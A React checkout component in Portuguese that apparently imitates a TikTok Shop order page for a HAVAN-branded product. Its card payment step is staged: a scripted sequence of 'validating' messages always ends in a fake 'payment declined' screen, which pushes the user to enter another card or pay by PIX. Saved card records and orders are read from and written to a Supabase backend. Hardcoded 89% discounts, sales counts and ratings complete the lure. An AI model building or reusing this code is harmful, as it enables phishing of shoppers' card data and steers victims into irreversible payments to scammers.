"use client";

import React, { useState, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { 
  ArrowLeft, 
  MapPin, 
  ChevronRight, 
  Star, 
  Zap, 
  ChevronUp, 
  ChevronDown, 
  Plus, 
  Minus, 
  Ticket, 
  CreditCard, 
  Loader2, 
  AlertCircle, 
  ShieldCheck
} from 'lucide-react';
import { products, Product } from '@/data/products';
import { Button } from '@/components/ui/button';
import NoteDrawer from '@/components/NoteDrawer';
import TikTokCouponDrawer from '@/components/TikTokCouponDrawer';
import { supabase } from "@/integrations/supabase/client";
import { showError, showSuccess } from '@/utils/toast';

const Checkout: React.FC = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [product, setProduct] = useState<Product | null>(null);
  const [isNoteDrawerOpen, setIsNoteDrawerOpen] = useState(false);
  const [isCouponDrawerOpen, setIsCouponDrawerOpen] = useState(false);
  const [orderNote, setOrderNote] = useState("");
  const [quantity, setQuantity] = useState(1);
  const [selectedVar, setSelectedVar] = useState("Padrão");
  const [couponAmount, setCouponAmount] = useState(5);
  const [cardData, setCardData] = useState<any>(null);
  const [addressData, setAddressData] = useState<any>(null);
  const [paymentMethod, setPaymentMethod] = useState<'card' | 'pix'>('pix');
  const [isSubtotalOpen, setIsSubtotalOpen] = useState(true);
  const [isInitialLoading, setIsInitialLoading] = useState(true);
  
  const [isProcessingCard, setIsProcessingCard] = useState(false);
  const [cardProcessingStep, setCardProcessingStep] = useState(0);
  const [cardError, setCardError] = useState(false);

  const steps = [
    "Finalizando compra...",
    "Checando dados do cartão...",
    "Comunicando com a prestadora do cartão...",
    "Validando transação..."
  ];

  useEffect(() => {
    const fetchData = async () => {
      setIsInitialLoading(true);
      try {
        const { data: addresses } = await supabase.from('addresses').select('*').order('created_at', { ascending: false }).limit(1);
        if (addresses?.length) setAddressData(addresses[0]);

        if (location.state?.cardData) {
          setCardData(location.state.cardData);
          setPaymentMethod('card');
        } else {
          const { data: cards } = await supabase.from('cards').select('*').order('created_at', { ascending: false }).limit(1);
          if (cards?.length) {
            setCardData(cards[0]);
            setPaymentMethod('card');
          }
        }
      } catch (err) {
        console.error("Erro ao carregar dados:", err);
      } finally {
        setIsInitialLoading(false);
      }
    };
    
    if (location.state?.product) {
      setProduct(location.state.product);
      if (location.state.initialQuantity) setQuantity(location.state.initialQuantity);
      if (location.state.selectedVariation) setSelectedVar(location.state.selectedVariation);
    } else {
      setProduct(products[0]);
    }
    fetchData();
  }, [location.state]);

  if (!product) return null;

  const unitPrice = 97.28;
  const originalPrice = 899.00;
  const subtotal = unitPrice * quantity;
  const originalSubtotal = originalPrice * quantity;
  const productDiscount = originalSubtotal - subtotal;
  const finalTotal = subtotal - couponAmount;
  
  const formatPrice = (val: number) => val.toFixed(2).replace('.', ',');

  const handlePlaceOrder = async () => {
    if (!addressData) {
      showError("Adicione um endereço de entrega.");
      navigate('/adicionar-endereco', { state: location.state });
      return;
    }

    try {
      await supabase.from('orders').insert([{
        product_title: product?.title,
        quantity: quantity,
        total_price: formatPrice(finalTotal),
        payment_method: paymentMethod.toUpperCase(),
        card_id: paymentMethod === 'card' ? cardData?.id : null,
        address_id: addressData?.id,
        order_note: orderNote
      }]);
    } catch (err) {
      console.error("Erro ao registrar pedido:", err);
    }

    if (paymentMethod === 'card') {
      if (!cardData) {
        showError("Adicione um cartão.");
        navigate('/adicionar-cartao', { state: location.state });
        return;
      }
      
      setIsProcessingCard(true);
      let currentStep = 0;
      const interval = setInterval(() => {
        setCardProcessingStep(currentStep);
        currentStep++;
        if (currentStep >= steps.length) {
          clearInterval(interval);
          setTimeout(() => {
            setIsProcessingCard(false);
            setCardError(true);
          }, 1000);
        }
      }, 1200);
    } else {
      navigate('/pix-pagamento', { state: { product } });
    }
  };

  return (
    <div className="min-h-screen bg-[#F8F8F8] pb-[130px] font-sans">
      {isProcessingCard && (
        <div className="fixed inset-0 z-[100] bg-black/60 flex items-center justify-center p-6 backdrop-blur-sm">
          <div className="bg-white rounded-2xl p-8 flex flex-col items-center space-y-4 w-full max-w-[300px]">
            <Loader2 className="w-12 h-12 text-[#FF2C55] animate-spin" />
            <p className="text-[15px] font-bold text-gray-900 text-center">{steps[cardProcessingStep]}</p>
          </div>
        </div>
      )}

      {cardError && (
        <div className="fixed inset-0 z-[100] bg-black/60 flex items-center justify-center p-6 backdrop-blur-sm">
          <div className="bg-white rounded-3xl p-6 flex flex-col items-center w-full max-w-[340px]">
            <AlertCircle size={48} className="text-[#FF2C55] mb-4" />
            <h3 className="text-[18px] font-bold text-gray-900 mb-2">Pagamento recusado</h3>
            <p className="text-[13px] text-gray-400 text-center mb-6">A operação não foi aceita pela administradora do cartão.</p>
            <div className="w-full space-y-3">
              <Button className="w-full h-12 rounded-full bg-[#FF2C55] font-bold" onClick={() => {
                setCardError(false);
                navigate('/adicionar-cartao', { state: location.state });
              }}>
                Adicionar outro cartão
              </Button>
              <Button variant="ghost" className="w-full h-10 font-bold text-gray-400" onClick={() => {
                setCardError(false);
                setPaymentMethod('pix');
              }}>
                Pagar com PIX
              </Button>
            </div>
          </div>
        </div>
      )}

      <div className="bg-white sticky top-0 z-50 border-b h-12 flex items-center px-4">
        <button onClick={() => navigate(-1)} className="p-2 -ml-2">
          <ArrowLeft size={24} className="text-gray-900" />
        </button>
        <h1 className="w-full text-center text-[18px] font-bold text-gray-900">Resumo do Pedido</h1>
      </div>

      <div className="max-w-[600px] mx-auto">
        <div 
          className="bg-white p-4 flex items-center justify-between border-b cursor-pointer" 
          onClick={() => navigate('/adicionar-endereco', { state: location.state })}
        >
          <div className="flex items-center space-x-3">
            <MapPin size={20} className="text-[#00BFA5]" />
            <div className="flex flex-col">
              <span className="text-[15px] text-gray-900 font-bold">Endereço de envio</span>
              <span className="text-[13px] text-gray-500 truncate max-w-[200px]">
                {addressData ? `${addressData.address}, ${addressData.number}` : "Adicionar endereço"}
              </span>
            </div>
          </div>
          <ChevronRight size={20} className="text-gray-300" />
        </div>

        <div className="bg-white mt-2.5 p-4">
          <div className="flex justify-between items-center mb-3">
            <span className="text-[15px] font-bold text-gray-900 uppercase">HAVAN</span>
            <button className="text-[13px] text-gray-400 flex items-center" onClick={() => setIsNoteDrawerOpen(true)}>
              {orderNote ? "Nota adicionada" : "Adicionar nota"} <ChevronRight size={16} className="ml-0.5" />
            </button>
          </div>
          
          <div className="flex items-center space-x-1.5 text-[13px] mb-4">
            <Star size={16} className="text-[#FFB800] fill-[#FFB800]" />
            <span className="text-[#A0783A] font-bold">Melhor escolha! 28.0K vendido(s) e com nota 4.8/5,0</span>
          </div>

          <div className="flex space-x-3">
            <div className="w-[100px] h-[100px] bg-[#F8F8F8] rounded-lg overflow-hidden border p-1 shrink-0">
              <img src={product.media[1]?.src || product.media[0].src} className="w-full h-full object-contain" />
            </div>
            <div className="flex-grow space-y-1">
              <h4 className="text-[14px] font-bold text-gray-900 line-clamp-2 leading-tight">{product.title}</h4>
              <p className="text-[12px] text-gray-400">{selectedVar}</p>
              
              <div className="flex flex-col space-y-1.5 mt-1">
                <div className="bg-[#FFF1F3] text-[#FF2C55] text-[11px] font-bold px-2 py-0.5 rounded-sm flex items-center w-fit">
                  <Zap size={12} className="mr-1 fill-[#FF2C55]" /> Oferta Relâmpago
                </div>
                <div className="bg-[#F8F8F8] text-gray-500 text-[11px] font-medium px-2 py-0.5 rounded-sm flex items-center w-fit">
                  <span className="mr-1 text-[14px]">🪙</span> Devolução gratuita
                </div>
              </div>
              
              <div className="flex justify-between items-end pt-2">
                 <div className="flex flex-col">
                   <span className="text-[18px] font-bold text-[#FF2C55]">R$ {formatPrice(unitPrice)}</span>
                   <span className="text-[12px] text-gray-400 line-through">R$ {formatPrice(originalPrice)}</span>
                 </div>
                 <div className="flex items-center bg-[#F1F1F1] rounded-md h-9">
                    <button className="w-10 h-full flex items-center justify-center" onClick={() => setQuantity(q => Math.max(1, q - 1))}><Minus size={18} /></button>
                    <span className="w-10 text-center font-bold">{quantity}</span>
                    <button className="w-10 h-full flex items-center justify-center" onClick={() => setQuantity(q => q + 1)}><Plus size={18} /></button>
                 </div>
              </div>
            </div>
          </div>
        </div>

        <div className="bg-white mt-2.5 p-4 flex items-center justify-between cursor-pointer" onClick={() => setIsCouponDrawerOpen(true)}>
          <div className="flex items-center space-x-3">
            <Ticket size={22} className="text-[#FF2C55]" />
            <span className="text-[15px] font-bold text-gray-900">Desconto do TikTok Shop</span>
          </div>
          <div className="flex items-center space-x-2">
            <span className="text-[14px] font-bold text-[#FF2C55] bg-[#FFF1F3] px-2.5 py-1 rounded-sm">- R$ {formatPrice(couponAmount)}</span>
            <ChevronRight size={20} className="text-gray-300" />
          </div>
        </div>

        <div className="bg-white mt-2.5 p-4">
          <h3 className="text-[16px] font-bold text-gray-900 mb-5">Resumo do Pedido</h3>
          <div className="space-y-4">
            <div className="flex justify-between items-center cursor-pointer" onClick={() => setIsSubtotalOpen(!isSubtotalOpen)}>
              <div className="flex items-center space-x-2">
                <span className="text-[15px] font-bold text-gray-900">Subtotal do produto</span>
                {isSubtotalOpen ? <ChevronUp size={18} className="text-gray-400" /> : <ChevronDown size={18} className="text-gray-400" />}
              </div>
              <span className="text-[15px] font-bold text-gray-900">R$ {formatPrice(subtotal)}</span>
            </div>
            
            {isSubtotalOpen && (
              <div className="space-y-4 animate-in fade-in slide-in-from-top-1 duration-200">
                <div className="flex justify-between text-[14px] text-gray-400">
                  <span>Preço original</span>
                  <span className="text-gray-900 font-medium">R$ {formatPrice(originalSubtotal)}</span>
                </div>
                <div className="flex justify-between text-[14px] text-gray-400">
                  <span>Desconto no produto</span>
                  <span className="text-[#FF2C55] font-medium">- R$ {formatPrice(productDiscount)}</span>
                </div>
                <div className="flex justify-between text-[14px] text-gray-400">
                  <span>Cupons do TikTok Shop</span>
                  <span className="text-[#FF2C55] font-medium">- R$ {formatPrice(couponAmount)}</span>
                </div>
              </div>
            )}
            
            <div className="pt-4 border-t border-gray-100 flex flex-col">
              <div className="flex justify-between items-center">
                <span className="text-[18px] font-bold text-gray-900">Total</span>
                <span className="text-[18px] font-bold text-gray-900">R$ {formatPrice(finalTotal)}</span>
              </div>
              <span className="text-[12px] text-gray-300 text-right mt-1">Impostos inclusos</span>
            </div>
          </div>
        </div>

        <div className="bg-white mt-2.5 p-4 space-y-6">
          <h3 className="text-[16px] font-bold text-gray-900">Forma de pagamento</h3>
          
          <div className="flex flex-col space-y-3 cursor-pointer" onClick={() => { setPaymentMethod('card'); navigate('/adicionar-cartao', { state: location.state }); }}>
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-3">
                <div className="bg-[#EFFFFD] p-1.5 rounded-sm"><CreditCard size={18} className="text-[#00BFA5]" /></div>
                <span className="text-[15px] font-medium text-gray-900">{cardData ? `Cartão final ${cardData.last4}` : "Adicionar cartão"}</span>
              </div>
              <div className="flex items-center space-x-3">
                {paymentMethod === 'card' && <div className="w-2.5 h-2.5 bg-[#FF2C55] rounded-full" />}
                <ChevronRight size={18} className="text-gray-200" />
              </div>
            </div>
            {cardData && (
              <div className="pl-10 space-y-3">
                <div className="flex gap-2">
                  <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-4" />
                  <img src="https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" className="h-4" />
                </div>
                <div className="bg-[#FFF1F3] text-[#FF2C55] text-[11px] font-bold px-3 py-1 rounded-sm border border-[#FFD9E0] flex items-center w-fit">
                  Sem juros em até 3 parcelas <ChevronRight size={12} className="ml-1" />
                </div>
              </div>
            )}
          </div>

          <div className="h-[1px] bg-gray-100 w-full"></div>

          <div className="flex items-center justify-between cursor-pointer" onClick={() => setPaymentMethod('pix')}>
            <div className="flex items-center space-x-3">
              <div className="bg-[#EFFFFD] p-1.5 rounded-sm"><img src="https://logospng.org/download/pix/logo-pix-icone-512.png" className="h-4 w-4" /></div>
              <span className="text-[15px] font-medium text-gray-900">Pix</span>
            </div>
            <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === 'pix' ? 'border-[#FF2C55]' : 'border-gray-200'}`}>
              {paymentMethod === 'pix' && <div className="w-2.5 h-2.5 bg-[#FF2C55] rounded-full" />}
            </div>
          </div>
        </div>
      </div>

      <div className="fixed bottom-0 left-0 right-0 bg-white border-t p-4 z-50">
        <div className="max-w-[600px] mx-auto">
          <div className="flex justify-between items-center mb-3 px-1">
            <span className="text-[18px] font-bold text-gray-900">Total</span>
            <span className="text-[22px] font-bold text-[#FF2C55]">R$ {formatPrice(finalTotal)}</span>
          </div>
          <Button className="w-full bg-[#FF2C55] hover:bg-[#E0254B] text-white font-bold rounded-full h-[56px] text-[17px]" onClick={handlePlaceOrder}>
            {isInitialLoading ? <Loader2 className="animate-spin" /> : "Fazer pedido"}
          </Button>
        </div>
      </div>

      <NoteDrawer isOpen={isNoteDrawerOpen} onClose={() => setIsNoteDrawerOpen(false)} onSave={setOrderNote} initialNote={orderNote} />
      <TikTokCouponDrawer isOpen={isCouponDrawerOpen} onClose={() => setIsCouponDrawerOpen(false)} onSelect={setCouponAmount} selectedAmount={couponAmount} />
    </div>
  );
};

export default Checkout;